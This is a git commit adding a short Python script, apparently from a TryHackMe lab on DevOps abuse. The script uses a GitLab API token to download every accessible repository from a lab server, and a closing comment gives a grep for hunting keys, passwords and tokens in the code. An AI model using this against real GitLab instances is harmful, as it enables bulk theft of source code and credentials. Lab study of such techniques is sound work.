e5d5d354ada9b3ed28dc06d5084452054db09fb9
Filippo Bersani <filobers@protonmail.com>
2024-10-11 11:36:54 +0200

    Create download_gitlab_projects.py

---
+++ devops_abuse/download_gitlab_projects.py
@@ -0,0 +1,33 @@
+# courtesy from tryhackme
+
+import gitlab
+import uuid
+
+url = "http://gitlab.zinzloun.loc"
+token = "<your gitlab API token>"
+
+# Create a Gitlab connection
+gl = gitlab.Gitlab(url, private_token=token)
+gl.auth()
+
+# Get all Gitlab projects
+projects = gl.projects.list(all=True)
+
+# Enumerate through all projects and try to download a copy
+for project in projects:
+    print ("Downloading project: " + str(project.name))
+    #Generate a UID to attach to the project, to allow us to download all versions of projects with the same name
+    UID = str(uuid.uuid4())
+    print (UID)
+    try:
+        repo_download = project.repository_archive(format='zip')
+        with open (str(project.name) + "_" + str(UID) +  ".zip", 'wb') as output_file:
+            output_file.write(repo_download)
+    except Exception as e:
+        # Based on permissions, we may not be able to download the project
+        print ("Error with this download")
+        print (e)
+        pass
+
+# to look for secrets inside a folder project (unzip it before):
+## └─$ grep -riE "key|password|token" .
